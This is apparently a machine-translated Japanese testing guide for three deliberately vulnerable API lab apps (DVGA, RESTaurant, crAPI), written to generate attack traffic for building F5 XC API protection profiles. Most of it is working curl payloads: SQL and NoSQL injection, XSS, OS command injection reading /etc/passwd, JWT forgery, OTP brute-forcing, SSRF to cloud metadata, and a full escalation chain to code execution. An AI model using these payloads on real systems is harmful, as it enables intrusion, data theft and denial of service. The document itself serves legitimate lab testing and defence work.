---
title: APIテストガイド
description: >-
  DVGA、RESTaurant、crAPIの包括的なエンドポイントカタログ、脆弱性マッピング、攻撃ペイロード — トラフィック生成およびF5 XC
  API保護プロファイル開発のためのオンボーディングリファレンス
sidebar:
  order: 8
i18n:
  sourceHash: 884e2d1be2b7
  translator: machine
---

## 概要

このガイドでは、3つのAPIセキュリティテストアプリケーション全体のAPIエンドポイント、意図的な脆弱性、攻撃ペイロードをすべてカタログ化しています。F5 XC API保護プロファイル開発のためのトラフィック生成パターンの構築にご活用ください。

| アプリケーション | プロトコル | パス | ポート | 認証 | 脆弱性 |
|---|---|---|---|---|---|
| **DVGA** | GraphQL | `/dvga/` | 80 | なし (admin: admin/password) | 25シナリオ |
| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (フォームエンコード) | OWASP API 2023の7カテゴリ |
| **crAPI** | REST (マイクロサービス) | `/` | 8888 | JWT (Bearer) | 18以上のチャレンジ |

### 環境変数

```bash
ORIGIN="http://<ORIGIN_IP>"
CRAPI="http://<ORIGIN_IP>:8888"
```

---

## DVGA (Damn Vulnerable GraphQL Application)

**GraphQLエンドポイント:** `POST ${ORIGIN}/dvga/graphql`
**GraphiQL IDE:** `GET ${ORIGIN}/dvga/`
**管理者認証情報:** admin / password

DVGAのすべてのインタラクションは、JSON `{"query":"..."}` ペイロードを含むPOSTリクエストで単一のエンドポイント（`/dvga/graphql`）を使用します。

### スキーマ概要

```
Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
Mutations: createPaste, importPaste, uploadPaste
Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
          OwnerObject (id, username, pastes)  ← 循環参照
```

### エンドポイントリファレンス

| オペレーション | タイプ | 認証 | 目的 |
|---|---|---|---|
| `pastes(public, filter, limit)` | Query | なし | ペースト一覧（filterを介したSQLインジェクション） |
| `paste(id)` | Query | なし | 単一ペーストの取得 |
| `me(token)` | Query | なし | JWTによるユーザー取得（偽造に脆弱） |
| `systemHealth` | Query | なし | ヘルスチェック |
| `systemUpdate` | Query | なし | 低速クエリ（約82秒、DoSベクター） |
| `systemDiagnostics(cmd)` | Query | admin/password | ホワイトリスト化されたOSコマンドの実行 |
| `createPaste(title, content, public)` | Mutation | なし | ペースト作成（contentを介したXSS） |
| `importPaste(host, port, path, scheme)` | Mutation | なし | リモートペーストのインポート（SSRF、コマンドインジェクション） |
| `uploadPaste(filename, content)` | Mutation | なし | ペーストのアップロード（パストラバーサル） |

### 脆弱性カタログ

#### 1. サービス拒否 (DoS)（6シナリオ）

**バッチクエリ攻撃:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
```

**深い再帰（Owner/Pasteの循環参照）:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
```

**リソース集約型クエリ（約82秒のレスポンス）:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemUpdate}"}'
```

**フィールド重複（フィールドを500回以上繰り返す）:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
```

**エイリアスベース攻撃（1000のエイリアスオペレーション）:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{q0:systemUpdate q1:systemUpdate q2:systemUpdate q3:systemUpdate q4:systemUpdate q5:systemUpdate q6:systemUpdate q7:systemUpdate q8:systemUpdate q9:systemUpdate}"}'
```

#### 2. 情報漏洩（5シナリオ）

**イントロスペクション（完全なスキーマ列挙）:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
```

**フィールドサジェスト（タイポにより有効なフィールドが明らかに）:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{titl}}"}'
```

**importPasteを介したSSRF（内部サービスの探査）:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
```

#### 3. インジェクション（4シナリオ）

**filterパラメータを介したSQLインジェクション:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
```

**createPasteを介した格納型XSS:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
```

**ログインジェクション（オペレーション名のスプーフィング）:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
```

#### 4. コード実行（3シナリオ）

**importPasteを介したOSコマンドインジェクション:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
```

**systemDiagnosticsを介したOSコマンド（管理者認証が必要）:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
```

#### 5. 認可バイパス（3シナリオ）

**JWTトークン偽造（署名なしトークンを受け入れる）:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
```

**uploadPasteを介した任意のファイル書き込み（パストラバーサル）:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{uploadPaste(filename:\"../../../tmp/test.txt\",content:\"path traversal test\"){result}}"}'
```

---

## RESTaurant API (Damn Vulnerable RESTaurant)

**Swagger UI:** `${ORIGIN}/restaurant/docs`
**OpenAPI仕様:** `${ORIGIN}/restaurant/openapi.json`
**認証:** フォームエンコードPOSTによるJWT（`/restaurant/token`）
**ロール:** Customer（デフォルト）、Employee、Chef（管理者）

### セットアップ: 登録と認証

```bash
# テストユーザーの登録
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'

# JWTトークンの取得（注意: JSONではなくフォームエンコード）
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Bearer token: ${TOKEN}"
```

### エンドポイントリファレンス

| エンドポイント | メソッド | 認証 | ロール | 脆弱性 |
|---|---|---|---|---|
| `/restaurant/register` | POST | なし | — | ユーザー作成 |
| `/restaurant/token` | POST | なし | — | 弱い秘密鍵のJWT (97952) |
| `/restaurant/healthcheck` | GET | なし | — | ヘルスチェック |
| `/restaurant/profile` | GET | あり | 任意 | ユーザープロファイル |
| `/restaurant/profile` | PUT | あり | 任意 | **BOLA**（他ユーザーの変更） |
| `/restaurant/profile` | PATCH | あり | 任意 | **BOPLA**（ロールの一括割り当て） |
| `/restaurant/users/update_role` | PUT | あり | 任意 | **BFLA**（ロールの昇格） |
| `/restaurant/menu` | GET | あり | 任意 | メニュー項目の一覧 |
| `/restaurant/menu` | PUT | あり | Employee以上 | メニュー作成（画像を介した**SSRF**） |
| `/restaurant/menu/{item_id}` | PUT | あり | Employee以上 | メニュー更新（画像を介した**SSRF**） |
| `/restaurant/menu/{item_id}` | DELETE | あり | 任意 | **BFLA**（任意のユーザーが削除可能） |
| `/restaurant/orders` | GET | あり | 任意 | **BOLA**（全注文の閲覧） |
| `/restaurant/orders` | POST | あり | 任意 | 注文作成 |
| `/restaurant/orders/{order_id}` | GET | あり | 任意 | **BOLA**（他の注文へのアクセス） |
| `/restaurant/orders/status/{order_id}` | GET | あり | 任意 | 注文ステータス |
| `/restaurant/admin/stats/disk` | GET | あり | Chef | **コマンドインジェクション** |
| `/restaurant/reset-password` | POST | なし | — | パスワードリセット要求 |
| `/restaurant/reset-password/new-password` | POST | なし | — | 新しいパスワードの設定 |
| `/restaurant/referral-code` | GET | あり | 任意 | リファラルコードの取得 |
| `/restaurant/apply-referral` | POST | あり | 任意 | リファラルの適用 |
| `/restaurant/discount-coupons` | GET | あり | 任意 | クーポン一覧 |

### 脆弱性カタログ

#### API1:2023 — オブジェクトレベル認可の不備 (BOLA)

**他のユーザーのプロファイルを変更:**
```bash
curl -X PUT ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
```

**他のユーザーの注文にアクセス（オフセット列挙）:**
```bash
for i in 1 2 3 4 5; do
  curl -sf ${ORIGIN}/restaurant/orders/${i} \
    -H "Authorization: Bearer ${TOKEN}" 2>&1
  echo ""
done
```

#### API2:2023 — 認証の不備

**JWT弱い秘密鍵のブルートフォース（秘密鍵は6桁: 97952）:**
```bash
# jwt.ioでトークンのデコードと偽造
# 秘密鍵: 97952（hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' でブルートフォース可能）

# Chefトークンの偽造:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# 秘密鍵 97952 で署名
```

#### API3:2023 — オブジェクトプロパティレベル認可の不備 (BOPLA)

**CustomerからChefへのロール一括割り当て:**
```bash
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

**昇格パス: Customer → Employee → Chef:**
```bash
# ステップ1: Employeeへ昇格
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Employee"}'

# ステップ2: Chefへ昇格
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

#### API5:2023 — 機能レベル認可の不備 (BFLA)

**Customerとしてメニュー項目を削除（Employee以上が必要なはず）:**
```bash
curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
  -H "Authorization: Bearer ${TOKEN}"
```

**他のユーザーのロールを変更:**
```bash
curl -X PUT ${ORIGIN}/restaurant/users/update_role \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","role":"Customer"}'
```

#### API7:2023 — サーバーサイドリクエストフォージェリ (SSRF)

**メニューのimage_urlを介した内部エンドポイントの探査（Employeeロールが必要）:**
```bash
# まずBOPLAでEmployeeに昇格してから:
curl -X PUT ${ORIGIN}/restaurant/menu \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
```

#### API8:2023 — インジェクション

**ディスク統計を介したOSコマンドインジェクション（Chefロールが必要）:**
```bash
# Chefへの昇格後:
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
  -H "Authorization: Bearer ${TOKEN}"

curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
  -H "Authorization: Bearer ${TOKEN}"
```

### 完全な攻撃チェーン: Customerからrootへ

```bash
# 1. 登録
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'

# 2. トークン取得
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 3. Chefに昇格 (BOPLA)
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'

# 4. Chefレベルのトークンを取得するため再認証
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 5. コマンドインジェクション (RCE)
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
  -H "Authorization: Bearer ${TOKEN}"
```

---

## crAPI (OWASP Completely Ridiculous API)

**Web UI:** `${CRAPI}/`
**MailHog:** `${CRAPI}/mailhog/`（検証用メールキャプチャ）
**認証:** JWT Bearerトークン（RS256、アルゴリズム混同に脆弱）
**アーキテクチャ:** 7つのマイクロサービス（identity、community、workshop、postgres、mongo、mailhog、web）

### セットアップ: 登録、メール検証、ログイン

```bash
# 1. 登録
curl -X POST ${CRAPI}/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'

# 2. MailHogで検証メールを確認
# ${CRAPI}/mailhog/ をブラウザで開くか、MailHog APIを使用:
curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
import sys,json
msgs = json.load(sys.stdin)['items']
for m in msgs:
    print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
"

# 3. ログインしてJWTトークンを取得
TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "Bearer token: ${TOKEN}"
```

### エンドポイントリファレンス

#### Identityサービス

| エンドポイント | メソッド | 認証 | 脆弱性 |
|---|---|---|---|
| `/identity/api/auth/signup` | POST | なし | 登録 |
| `/identity/api/auth/login` | POST | なし | JWTトークン（アルゴリズム混同） |
| `/identity/api/auth/forget-password` | POST | なし | OTP要求 |
| `/identity/api/auth/v2/check-otp` | POST | なし | **レート制限なし**（4桁OTPのブルートフォース） |
| `/identity/api/auth/v3/check-otp` | POST | なし | レート制限ありバージョン |
| `/identity/api/v2/user/dashboard` | GET | あり | ユーザープロファイル |
| `/identity/api/v2/user/change-email` | PUT | あり | メール変更 |
| `/identity/api/v2/vehicle/vehicles` | GET | あり | 車両一覧（UUIDの漏洩） |
| `/identity/api/v2/vehicle/{uuid}/location` | GET | あり | **BOLA**（任意のユーザーの車両） |
| `/identity/api/v2/user/videos` | POST | あり | 動画アップロード |
| `/identity/api/v2/user/videos/{id}` | GET | あり | **データ露出**（conversion_params） |
| `/identity/api/v2/user/videos/{id}` | PUT | あり | **一括割り当て**（コマンドインジェクション） |
| `/identity/api/v2/admin/videos/{id}` | DELETE | あり | **BFLA**（管理者チェックなし） |

#### Communityサービス

| エンドポイント | メソッド | 認証 | 脆弱性 |
|---|---|---|---|
| `/community/api/v2/community/posts` | GET | あり | **データ露出**（vehicle_id、emailの漏洩） |
| `/community/api/v2/community/posts` | POST | あり | ブログ投稿の作成 |
| `/community/api/v2/community/posts/{id}/comments` | POST | あり | コメントの追加 |
| `/community/api/v2/coupon/validate-coupon` | POST | あり | **NoSQLインジェクション** |

#### Workshopサービス

| エンドポイント | メソッド | 認証 | 脆弱性 |
|---|---|---|---|
| `/workshop/api/mechanic` | GET | あり | **データ露出**（整備士のメール） |
| `/workshop/api/mechanic/mechanic_report` | GET | なし | **BOLA**（認証なし、連番ID） |
| `/workshop/api/merchant/contact_mechanic` | POST | あり | **SSRF** + **DoS** |
| `/workshop/api/shop/products` | GET | あり | 商品カタログ |
| `/workshop/api/shop/orders/` | POST | あり | 注文作成 |
| `/workshop/api/shop/orders/all` | GET | あり | 注文一覧 |
| `/workshop/api/shop/orders/{id}` | GET | なし | **BOLA**（認証不要） |
| `/workshop/api/shop/orders/{id}` | PUT | あり | **一括割り当て**（status、quantity） |
| `/workshop/api/shop/apply_coupon` | POST | あり | **SQLインジェクション** |

### チャレンジカタログ

#### チャレンジ1 — BOLA: 他のユーザーの車両位置情報にアクセス

```bash
# まず自分の車両UUIDを取得
curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
  -H "Authorization: Bearer ${TOKEN}"

# 他のユーザーの車両にアクセス（UUIDを置き換え）
curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
  -H "Authorization: Bearer ${TOKEN}"
```

#### チャレンジ2 — BOLA: 整備士レポートへのアクセス（認証なし）

```bash
# 連番IDの列挙 — トークン不要
for i in 1 2 3 4 5; do
  echo "Report $i:"
  curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
  echo ""
done
```

#### チャレンジ3 — 認証の不備: パスワードリセットOTPのブルートフォース

```bash
# 被害者のOTPを要求
curl -X POST ${CRAPI}/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# 4桁OTPのブルートフォース（v2にはレート制限なし）
for otp in $(seq -w 0000 9999); do
  RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"${otp}\"}" 2>&1)
  echo "$otp: $RESULT" | grep -v "Invalid OTP" && break
done
```

#### チャレンジ4 — データ露出: 整備士メールの漏洩

```bash
curl -sf ${CRAPI}/workshop/api/mechanic \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
```

#### チャレンジ5 — データ露出: 内部動画変換パラメータ

```bash
# 動画をアップロードし、レスポンスを確認
curl -sf ${CRAPI}/identity/api/v2/user/videos \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
# レスポンス内のconversion_paramsフィールドを確認
```

#### チャレンジ6 — DoS: 整備士への問い合わせを介したレイヤー7攻撃

```bash
curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "mechanic_code":"MECH001",
    "problem_details":"Engine issue",
    "vin":"VEHICLE_VIN",
    "mechanic_api":"http://localhost:8080/api",
    "repeat_request_if_failed":true,
    "number_of_repeats":100
  }'
```

#### チャレンジ7 — BFLA: 管理者エンドポイントを介した動画の削除

```bash
# 一般ユーザーが管理者エンドポイントにアクセス可能
curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
  -H "Authorization: Bearer ${TOKEN}"
```

#### チャレンジ8 & 9 — 一括割り当て: 注文操作による無料商品の取得

```bash
# GETをPUTに変更し、statusとquantityを修正
curl -X PUT ${CRAPI}/workshop/api/shop/orders/1 \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"status":"returned","quantity":100}'
```

#### チャレンジ10 — 動画変換パラメータを介したコマンドインジェクション

```bash
curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"conversion_params":"-v codec h264; cat /etc/passwd"}'
```

#### チャレンジ11 — 整備士への問い合わせを介したSSRF

```bash
curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "mechanic_code":"MECH001",
    "problem_details":"test",
    "vin":"VIN123",
    "mechanic_api":"http://169.254.169.254/latest/meta-data/",
    "repeat_request_if_failed":false,
    "number_of_repeats":0
  }'
```

#### チャレンジ12 — NoSQLインジェクション: クーポンコードの抽出

```bash
curl -X POST ${CRAPI}/community/api/v2/coupon/validate-coupon \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code":{"$ne":1}}'
```

#### チャレンジ13 — SQLインジェクション: クーポンの複数回適用

```bash
curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
```

#### チャレンジ14 — 未認証の注文アクセス

```bash
# Authorizationヘッダーなし — それでもデータが返される
for i in 1 2 3 4 5; do
  curl -sf ${CRAPI}/workshop/api/shop/orders/${i}
  echo ""
done
```

#### チャレンジ15 — JWTアルゴリズム混同

```bash
# アルゴリズム "none" でJWTを偽造（署名検証なし）:
# 1. ヘッダーを設定: {"alg":"none","typ":"JWT"} としてbase64urlエンコード
# 2. ペイロードを設定: {"email":"admin@example.com","role":"admin"} としてbase64urlエンコード
# 3. ドットで結合し、署名は空のまま: <header>.<payload>.
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="${HEADER}.${PAYLOAD}."

curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer ${FORGED}"
```

---

## OWASP APIセキュリティTop 10 クロスリファレンス

| OWASPカテゴリ | DVGA | RESTaurant | crAPI |
|---|---|---|---|
| **API1: BOLA** | — | `PUT /profile`、`GET /orders/{id}` | 車両位置情報、整備士レポート、注文 |
| **API2: 認証の不備** | JWT偽造（`me`クエリ） | JWT弱い秘密鍵 (97952) | OTPブルートフォース (v2)、JWTアルゴリズム混同 |
| **API3: BOPLA** | — | `PATCH /profile`（ロール昇格） | 動画conversion_params、整備士メール露出 |
| **API4: リソース消費** | バッチ、再帰、エイリアス、フィールド重複DoS | レスポンス長によるユーザー列挙 | `contact_mechanic` repeat_request DoS |
| **API5: BFLA** | — | `DELETE /menu`、`PUT /users/update_role` | 一般ユーザーとして`DELETE /admin/videos` |
| **API6: 一括割り当て** | — | `PUT /orders`（status、quantity） | 注文のstatus/quantity、動画conversion_params |
| **API7: SSRF** | `importPaste`ミューテーション | `PUT /menu` image_url | `contact_mechanic` mechanic_api URL |
| **API8: インジェクション** | SQL（`filter`）、XSS（`content`）、OSコマンド（`importPaste`、`systemDiagnostics`） | OSコマンド（`/admin/stats/disk?parameters=`） | NoSQL（`validate-coupon`）、SQL（`apply_coupon`） |
| **API9: 不適切な資産管理** | — | — | 非推奨の`/auth/v2/check-otp`（レート制限なし） |
| **API10: 安全でない利用** | — | — | （SSRFを介した間接的な影響） |
| **GraphQL固有** | イントロスペクション、バッチ処理、再帰、エイリアス、フィールド重複、循環フラグメント | — | — |

---

## トラフィック生成パターン

### フェーズ1: ベースライン（正常パス）

攻撃パターンのテスト前に、正常なAPI動作を確立するための正当なトラフィックを生成します。

**DVGAベースライン:**
```bash
# 通常のクエリ
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
```

**RESTaurantベースライン:**
```bash
curl -sf ${ORIGIN}/restaurant/menu -H "Authorization: Bearer ${TOKEN}"
curl -sf ${ORIGIN}/restaurant/profile -H "Authorization: Bearer ${TOKEN}"
curl -X POST ${ORIGIN}/restaurant/orders -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"menu_item_id":1,"quantity":1}'
```

**crAPIベースライン:**
```bash
curl -sf ${CRAPI}/identity/api/v2/user/dashboard -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
```

### フェーズ2: OWASPカテゴリ別の攻撃トラフィック

**BOLAテスト:** 連番IDの列挙、リクエスト内のユーザー識別子の入れ替え、所有権なしでのリソースへのアクセス。

**インジェクションテスト:** filter/couponパラメータへのSQLペイロード、GraphQLクエリインジェクション、パラメータフィールドを介したOSコマンドインジェクション。

**認証バイパステスト:** JWTトークンの偽造、OTPのブルートフォース、非推奨APIバージョンの使用、アルゴリズム混同。

**SSRFテスト:** `importPaste`、`image_url`、`mechanic_api`パラメータへの内部URL。

**DoSテスト:** GraphQLのバッチ/再帰/エイリアス攻撃、高カウントの`repeat_request_if_failed`。

### フェーズ3: ステートフルな攻撃チェーン

一部の攻撃では、状態を伴う複数ステップのシーケンスが必要です:

1. **RESTaurant昇格チェーン:** 登録 → トークン → PATCHでChefにロール変更 → 再認証 → コマンドインジェクション
2. **crAPIフルフロー:** サインアップ → メール検証（MailHog） → ログイン → 車両追加 → 整備士への問い合わせ（SSRF） → 注文操作
3. **DVGA偵察からエクスプロイトへ:** イントロスペクション → systemDiagnosticsの発見 → 管理者認証情報のブルートフォース → OSコマンド実行

### レート推奨事項

| パターン | リクエスト/秒 | 期間 | 備考 |
|---|---|---|---|
| ベースライン（アプリごと） | 10-50 | 5分 | 正常なトラフィックフィンガープリントの確立 |
| BOLA列挙 | 100-500 | 2分 | 連番IDスキャン |
| OTPブルートフォース | 1000以上 | 発見まで | 最大10,000回の試行（4桁） |
| GraphQL DoS | 10-50 | 30秒 | 各リクエストはサーバー側で高コスト |
| インジェクションファジング | 50-200 | 5分 | リクエストごとにペイロードを変更 |
| SSRF探査 | 5-20 | 2分 | 低速; 各リクエストがサーバー側でHTTPリクエストをトリガー |
